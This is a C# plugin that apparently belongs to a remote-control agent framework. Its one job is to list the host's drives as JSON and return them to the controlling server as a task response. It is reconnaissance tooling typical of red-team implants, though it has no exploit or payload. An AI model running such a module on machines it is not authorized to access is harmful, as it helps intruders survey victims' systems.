using Agent.Interfaces;

using Agent.Interfaces;
using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;

namespace drives
{
    public class Drives : IPlugin
    {
        public string Name => "drives";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }
        public Drives(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            string output = JsonSerializer.Serialize(DriveInfo.GetDrives());

            await messageManager.AddResponse(new ResponseResult()
            {
                task_id = job.task.id,
                user_output = output,
                completed = true
            });
        }
    }
}
